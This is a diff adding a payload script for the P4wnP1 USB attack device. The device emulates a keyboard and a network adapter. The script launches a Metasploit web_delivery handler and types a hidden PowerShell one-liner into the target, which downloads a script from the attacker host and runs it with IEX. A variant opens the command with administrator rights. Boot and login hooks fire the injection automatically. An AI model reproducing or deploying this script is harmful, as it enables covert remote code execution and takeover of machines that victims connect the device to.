@@ -1,0 +1,115 @@
+
+# =============================
+# USB setup
+# =============================
+# Make sure to change USB_PID if you enable different USB functionality in order
+# to force Windows to enumerate the device again
+
+USE_ECM=true            # communication
+USE_RNDIS=false         # no mac os/linux support yet
+USE_HID=true            # payload delivery & execution
+USE_UMS=false           # not needed
+USE_RAWHID=true         # payload delivery & execution
+
+
+WIFI_ACCESSPOINT=true
+
+source msf_config.txt
+
+# This function gets called after the target host enables the network interface
+# (RNDIS, CDC ECM or both have to be enabled)
+function injectSessionFast(){
+	cat << EOF | duckhid
+		GUI r
+		DELAY $DELAY_TIME
+		STRING powershell.exe -nop -w hidden -c \$f=new-object net.webclient;\$f.proxy=[Net.WebRequest]::GetSystemWebProxy();\$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX \$f.downloadstring('http://$LHOST:8484/$URIPATH');
+	EOF
+}
+
+function injectSessionRoot(){
+	cat << EOF | duckhid
+		GUI
+		DELAY $DELAY_TIME
+		STRING powershell.exe -nop -w hidden -c \$f=new-object net.webclient;\$f.proxy=[Net.WebRequest]::GetSystemWebProxy();\$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX \$f.downloadstring('http://$LHOST:8484/$URIPATH');
+		CTRL-SHIFT RETURN
+		DELAY $(($DELAY_TIME*4))
+	EOF
+}
+function startWebdeliveryHandler(){
+	echo "starting postgresql... "
+	sudo systemctl start postgresql
+	echo "starting msfconsole/handler... "
+	#this takes a while and cant be run async because of some bug with screen -d that terminates screen after msfconsole started
+	screen -dmS web_delivery bash -c "source ~/.bash_profile; \
+		cd $MSFPATH; \
+		./msfconsole -L -x ' \
+			load msfd; \
+			use exploit/multi/script/web_delivery; \
+			set PAYLOAD $PAYLOAD; \
+			set LHOST $LHOST; \
+			set LPORT $LPORT; \
+			set URIPATH $URIPATH; \
+			exploit -j; \
+		' \
+	" \ 
+}
+function onNetworkUp()
+{
+	startWebdeliveryHandler
+
+	if [ FIRE_ON_BOOT -eq true ];then
+		if [ START_AS_ADMIN -eq true ]; then
+			injectSessionRoot
+		else
+			injectSessionFast
+		fi
+	fi
+}
+
+# this function gets called if the target host received a DHCP lease
+# (DHCP client has to be running on target)
+function onTargetGotIP()
+{
+	# commands in this callback function are ran as root
+	#
+	# available variables:
+	#	same as onNetworkUp()
+	#
+	# additional variables:
+	#	$target_ip:	The IP the target host received via its DHCP lease
+	#
+	# available commands:
+	#	same as onNetworkUp()
+
+}
+
+# this function gets called after P4wnP1 finished booting
+# Caution: 	This doesn't necessarily mean that "onNetworkUp" or "onTargetGotIP"
+#		have already been called
+function onBootFinished()
+{
+	# commands in this callback function are ran as user root
+}
+
+# commands in this function are ran if the user pi logs in (SSH or local)
+function onLogin()
+{
+	# commands in this callback function are ran as user pi
+	echo "injecting Payload"
+	if [ FIRE_ON_BOOT -eq true ];then
+		if [ START_AS_ADMIN -eq true ]; then
+			injectSessionRoot
+		else
+			injectSessionFast
+		fi
+	fi
+	echo "attaching to console"
+	screen -r web_delivery
+}
+
+# this function gets called if the target is done installing the driver for the HID keyboard
+# (USE_HID and HID_KEYBOARD_TEST have to be set to "true")
+function onKeyboardUp()
+{
+	# commands in this callback function are ran as user root
+}
